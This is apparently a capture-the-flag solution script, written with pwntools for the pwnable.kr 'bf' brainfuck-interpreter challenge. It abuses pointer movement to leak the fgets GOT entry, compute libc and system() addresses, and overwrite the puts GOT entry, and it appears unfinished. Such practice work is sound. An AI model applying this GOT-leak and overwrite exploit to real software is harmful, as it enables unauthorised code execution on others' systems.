#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

#r2 -e dbg.profile=bf.rr2

#libc = ELF('./libc.so.6')
#print 'strlen:' + hex( libc.symbols["strlen"] )
#print 'system:' + hex( libc.symbols["system"] )
#exit()

remoto = False
remoto = True
if remoto:
	host = 'pwnable.kr'
	host = '0'
	conn = connect(host, 9001)
else:
	conn = process('./bf')

p = 0x0804a0a0
fgets_got = 0x804a010
puts_got = 0x804a018
strlen_got = 0x804a020

"""
+: suma 1(byte) a donde apunta p
-: resta 1(byte) a donde apunta p
,: asigna un getchar() a donde apunta p
.: putchar(*p)
>: sumo 1 a p
<: resto 1 a p
[: not supported
"""

def sendPayload(payload):
	global p
	assert len(payload) <= 1024
	conn.sendline(payload)
	p -= payload.count('<')
	p += payload.count('>')

def get_system_addr():
	bytes_dif = p - fgets_got
	payload  = '<' * (bytes_dif - 3)
	payload += '.<'*4
	payload += '['
	sendPayload(payload)
	fgets = ''
	for i in range(4):
		fgets = conn.recv(1) + fgets
	fgets = u32(fgets)
	print 'leaked fgets:' + hex(fgets)
	libc = fgets - 0x5e150
	print 'libc base:' + hex(libc)
	system = libc + 0x0003ada0
	print 'system:' + hex(system)
	print ''
	return system

def get_got():
	funcs = ['fgets', '__stack_chk_fail', 'puts', '__gmon_start__', 'strlen']
	addrs = []
	bytes_dif = p - fgets_got
	payload  = '<' * (bytes_dif-3)
	payload += '.<' * 4 * len(funcs)
	sendPayload(payload)
	for i in range(len(funcs)):
		addr = ''
		for j in range(4):
			addr = conn.recv(1) + addr
		addr = u32(addr)
		print hex(addr) + ' - {}'.format(funcs[i])

def overwrite_puts():
	new_puts = 0x08048700
	bytes_dif = p - puts_got
	payload  = '<' * (bytes_dif - 3)
	payload += ',<' * 4
	payload += '['
	sendPayload(payload)
	conn.send('\x08')
	conn.send('\x04')
	conn.send('\x87')
	conn.send('\x00')
	print 'GOT puts overwriten'
	print ''

def main():
	conn.recvuntil('[ ]\n')

	overwrite_puts()
	system = get_system_addr()
	sendPayload('test tset')
	#conn.interactive()

	conn.close()

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		pass
